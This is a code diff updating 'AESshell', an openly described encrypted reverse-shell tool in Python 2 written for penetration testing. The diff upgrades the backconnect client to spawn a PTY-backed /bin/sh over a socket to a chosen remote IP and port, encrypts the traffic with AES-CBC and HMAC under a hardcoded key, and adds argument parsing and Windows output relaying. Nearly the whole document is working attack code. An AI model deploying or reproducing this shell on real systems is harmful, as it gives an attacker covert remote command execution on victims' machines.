@@ -5,10 +5,11 @@ import os
 import sys
 import time
 import hmac
-import hashlib
 import socket
 import select
 import Queue
+import hashlib
+import argparse
 import threading
 import subprocess
 import multiprocessing
@@ -16,7 +17,11 @@ import multiprocessing
 import cPickle as pickle
 from Crypto.Cipher import AES
 
-#win32 specific
+#unix specific
+if os.name == 'posix':
+	import pty
+
+#win32 specific, lets use sys here :>
 if sys.platform == 'win32':
 	import msvcrt
 
@@ -175,16 +180,6 @@ class winShell(object):
 				q.put(errLine)			
 
 
-version = "0.6"
-key = "F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4="
-
-def usage():
-	print "AESshell v%s - using AES-CBC + HMAC-SHA256" % version
-	print "backconnect part, use it on the system you need the shell"
-	print "spring 2015 by Marco Lux <ping@curesec.com>"
-	print
-	print "%s <ip> <port>" % (sys.argv[0])
-	print
 
 def buildSocket(rip,rport):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -222,10 +217,36 @@ def shellUnix(fdr, fdw):
 		os.dup2(fdr[1],1)
 		os.dup2(fdr[1],2) 
 
-		# execute shell
-		os.execve("/bin/sh",["sh","-i"],{})
+		# execute shell - with PTY
+		pty.spawn("/bin/sh")
 
-def main(rip,rport,key):
+def checkIfChildWasExited(chld,s):
+	if os.name == 'posix':
+		try:
+			os.kill(chld,0)
+		except TypeError:
+			#print "It's dead jim."
+			pp = os.getppid()
+			s.close()
+			os.kill(pp,9)
+
+def getAndSendData(q,ac,bc):
+	if os.name != 'posix' and q.qsize()>0:
+		while q.qsize>0:
+
+			# read from the queue
+			winData = q.get()
+
+			# encrypt the data
+			encStdout = ac.dumps(winData)
+
+			# send data to the listener
+			bc.send(encStdout)
+
+			if q.qsize() == 0:
+				break
+
+def run(rip,rport,key):
 	# list for filedescriptors and sockets to check
 	inputs = []
 
@@ -276,29 +297,24 @@ def main(rip,rport,key):
 		tE = threading.Thread (target = wS.readStdErr, args = (q,))
 		tE.daemon = True
 		tE.start()
-		
 
 	while True:
 
-		if os.name != 'posix' and q.qsize()>0:
-			while q.qsize>0:
+		#qsize while loop
+		if os.name != 'posix': getAndSendData(q,ac,bc)
 
-				# read from the queue
-				winData = q.get()
-
-				# encrypt the data
-				encStdout = ac.dumps(winData)
-
-				# send data to the listener
-				bc.send(encStdout)
-				if q.qsize() == 0:
-					break
+		# lets call it a hack
+		if os.name == 'posix': checkIfChildWasExited(chld,s)
 
 		try:
+			# on windows you cannot use select on non-socket objects
+			# as a result a queue is used. read and send via another function
+			# without extra process, but as select will block on windows
+			# a pretty short timeout was choosen
 			if os.name == 'posix':
 				inputrd , outputrd , errors = select.select(inputs,[],[])
 			else:
-				inputrd , outputrd , errors = select.select(inputs,[],[], 1)
+				inputrd , outputrd , errors = select.select(inputs,[],[], 0.0001)
 
 		except select.error, e:
 			print e
@@ -357,17 +373,30 @@ def main(rip,rport,key):
 			else:
 				# send command to windows file handle
 				wStdin = baggage[0]
-				os.write(wStdin.fileno(),decStdin)
+				try:
+					os.write(wStdin.fileno(),decStdin)
+				except OSError, e:
+#					print e
+					s.close()
+					sys.exit(1)
 
 	s.close()
 	print "[*] Finished"
 
+def main():
+	version = '0.7'
+	key = "F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4="
+
+	parser_description = "AESshell v%s - backconnect shell for windows and linux\n\t\tusing AES CBC Mode and HMAC-SHA256\n\t\tspring 2015 by Marco Lux <ping@curesec.com>" % version
+	parser = argparse.ArgumentParser(   prog = 'AESshell backconnect (bc.py)',\
+										description = parser_description,\
+										formatter_class=argparse.RawTextHelpFormatter)
+
+	parser.add_argument("-rip", action="store",dest="rip", required=True,help="Remote IP you want to connect to")
+	parser.add_argument("-rport", type=int, action="store",dest="rport", required=True,help="Remote Port you want to connect to")
+	
+	args = parser.parse_args()
+	run(args.rip, args.rport,key)
+
 if __name__ == "__main__":
-
-	if len(sys.argv)<3:
-		usage()
-		sys.exit(1)
-
-	rip = sys.argv[1]
-	rport = int(sys.argv[2])
-	main(rip,rport,key)
+	main()
